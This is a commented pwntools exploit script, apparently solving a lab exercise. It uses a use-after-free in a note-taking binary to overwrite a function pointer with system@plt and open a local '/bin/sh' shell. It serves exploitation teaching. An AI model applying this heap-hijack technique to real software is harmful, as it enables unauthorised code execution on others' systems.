#!/usr/bin/env python3
from pwn import *

# =============================================================================
# CONFIGURATION
# =============================================================================

# Target binary
exe = './bin/ex1'
elf = ELF(exe)

# Tell pwntools what we're talking to
context.binary = elf
# Keep debug logs on during development so you can see all IO.
# Switch to 'info' or 'warning' if it gets too noisy.
context.log_level = 'debug'


def start():
    """
    Start the vulnerable binary locally.

    The important bit here is using PTYs (pseudo-terminals) for stdin/stdout.
    The program uses stdio in a slightly interactive way (printf + scanf),
    and sometimes these prompts don't flush properly if they're not attached
    to a tty. Using PTYs makes it behave like a normal interactive terminal
    and keeps sendlineafter/recv working reliably.
    """
    if args.GDB:
        # Optional: run under gdb with a simple script
        return gdb.debug(exe, '''
            # You can add heap breakpoints here if you want to inspect chunks
            # b notes_create
            # b configure
            # b notes_read
            continue
        ''')
    else:
        # PTY is critical to avoid weird buffering hangs
        return process(exe, stdin=process.PTY, stdout=process.PTY)


# =============================================================================
# HELPER FUNCTIONS (MENU WRAPPERS)
# =============================================================================

def create_note(io, index, title, content):
    """
    Menu option 1: Create a note at a given index.

    note_t layout (from ex1.c):
        struct note {
            char title[16];   // user-controlled
            char content[48]; // user-controlled
        };

    This allocates sizeof(note_t) bytes on the heap and fills them with
    user-controlled data.
    """
    io.sendlineafter(b"Choose option: ", b"1")
    io.sendlineafter(b"index for your secure note: ", str(index).encode())
    io.sendlineafter(b"Input your title: ", title)
    io.sendlineafter(b"Input your note: ", content)


def read_note(io, index):
    """
    Menu option 2: Read a note.

    Vulnerable path (from ex1.c):
        if (CONFIG == NULL) ...
        ...
        CONFIG->printer(NOTES[index]);

    CONFIG is a global pointer to a config_t allocated with malloc, and
    CONFIG->printer is a function pointer in that struct. Because of the
    use-after-free, we’ll end up making this call through hijacked data.
    """
    io.sendlineafter(b"Choose option: ", b"2")
    io.sendlineafter(b"index for your secure note: ", str(index).encode())


def configure(io, filename):
    """
    Menu option 4: Configure the printer / save filename.

    In C:
        CONFIG = malloc(sizeof(config_t));
        fgets(CONFIG->save_filename, ...);
        CONFIG->printer = notes_printer;

    So this allocates a config_t on the heap and sets CONFIG->printer
    to a *legit* function pointer initially.
    """
    io.sendlineafter(b"Choose option: ", b"4")
    io.sendlineafter(b"Enter filename for save: ", filename)


def reset_config(io):
    """
    Menu option 5: Reset (free) the config.

    In C:
        void reset_config() {
            free(CONFIG);
        }

    BUG: CONFIG is never set back to NULL.
    That means CONFIG becomes a dangling pointer, and any later use of
    CONFIG (e.g. CONFIG->printer(...)) is a Use-After-Free.

    We'll exploit that by making malloc reuse the same chunk for a note.
    """
    io.sendlineafter(b"Choose option: ", b"5")


# =============================================================================
# MAIN EXPLOIT
# =============================================================================

def solve():
    io = start()

    # In this binary, PIE is disabled (no-pie), so addresses in the binary
    # are fixed. We can just grab system@plt once and hardcode it.
    system_plt = elf.plt['system']
    log.info(f"system@plt = {hex(system_plt)}")

    # -------------------------------------------------------------------------
    # Step 1: Create a "victim" note whose title is "/bin/sh"
    #
    # This note will be passed as an argument to our hijacked function pointer.
    #
    # struct note {
    #     char title[16];
    #     char content[48];
    # };
    #
    # The pointer passed to CONFIG->printer() is a note_t*, so the argument
    # points directly to the start of the struct => directly to title[0].
    #
    # If CONFIG->printer == system, the call looks effectively like:
    #     system(note->title);
    # so system("/bin/sh") if title is "/bin/sh".
    # -------------------------------------------------------------------------
    log.info("Step 1: Create note 0 with title '/bin/sh' (this becomes system argument)")
    create_note(io, 0, b"/bin/sh", b"A" * 8)

    # -------------------------------------------------------------------------
    # Step 2: Allocate CONFIG (config_t) on the heap
    #
    # struct config {
    #     void (*printer)(note_t *);
    #     char save_filename[56];
    # };
    #
    # This allocation creates a heap chunk that CONFIG points to:
    #
    #   [ config_t chunk ]
    #   +0x00: printer (function pointer)
    #   +0x08: save_filename[56]
    #
    # Later, we are going to free this chunk but keep CONFIG pointing at it.
    # -------------------------------------------------------------------------
    log.info("Step 2: Allocate config object (CONFIG = malloc(config_t))")
    configure(io, b"config_save.txt")

    # -------------------------------------------------------------------------
    # Step 3: Free CONFIG but leave the dangling pointer (Use-After-Free)
    #
    # reset_config():
    #     free(CONFIG);
    #
    # No CONFIG = NULL; afterwards.
    #
    # The chunk goes into the allocator’s free list (tcache/bin etc.), but the
    # global CONFIG pointer still contains the old heap address. A classic UAF.
    # -------------------------------------------------------------------------
    log.info("Step 3: Free CONFIG (UAF setup, CONFIG is now dangling)")
    reset_config(io)

    # -------------------------------------------------------------------------
    # Step 4: Reallocate the freed chunk as a note (tcache / fastbin reuse)
    #
    # The sizes of note_t and config_t are the same (64 bytes):
    #   note_t  : 16 (title) + 48 (content)  = 64
    #   config_t:  8 (printer) + 56 (fname)  = 64
    #
    # That means malloc(sizeof(note_t)) will return the EXACT same chunk
    # that was previously used for config_t (LIFO behaviour of tcache).
    #
    # We create note 1 here; its 'title' field overlaps CONFIG->printer.
    #
    # Layout of the re-used chunk when seen as note_t:
    #   +0x00: title[16]    (user-controlled)
    #   +0x10: content[48]  (user-controlled)
    #
    # But when the program still sees it as config_t:
    #   +0x00: printer      (we control via title[0..7])
    #   +0x08: save_filename
    #
    # So writing an 8-byte title lets us overwrite CONFIG->printer.
    # -------------------------------------------------------------------------
    log.info("Step 4: Allocate note 1 to reclaim freed CONFIG chunk and overwrite its printer pointer")

    payload_title = p64(system_plt)  # first 8 bytes of title = address of system()
    create_note(io, 1, payload_title, b"B" * 8)

    # At this point, the heap looks like:
    #   NOTES[0] -> note_0  (title = "/bin/sh", content = "AAAA...")
    #   NOTES[1] -> note_1  (same chunk as old CONFIG)
    #
    #   CONFIG   -> (still points to that same chunk as note_1)
    #       printer      == system
    #       save_filename == rest of note_1->title + content

    # -------------------------------------------------------------------------
    # Step 5: Trigger the use-after-free call via 'Read Note'
    #
    # notes_read():
    #   if (CONFIG == NULL) ...
    #   CONFIG->printer(NOTES[index]);
    #
    # CONFIG->printer is now system()
    # NOTES[0] is pointer to note_0 whose title is "/bin/sh"
    #
    # so effectively we get:
    #   system(NOTES[0]->title)  === system("/bin/sh");
    #
    # This pops a shell.
    # -------------------------------------------------------------------------
    log.info("Step 5: Trigger UAF - CONFIG->printer(NOTES[0]) == system(\"/bin/sh\")")
    read_note(io, 0)

    # If everything worked, we now have a shell.
    log.success("If exploit succeeded, you should now have a shell. Try running 'id'.")
    io.interactive()


if __name__ == "__main__":
    solve()

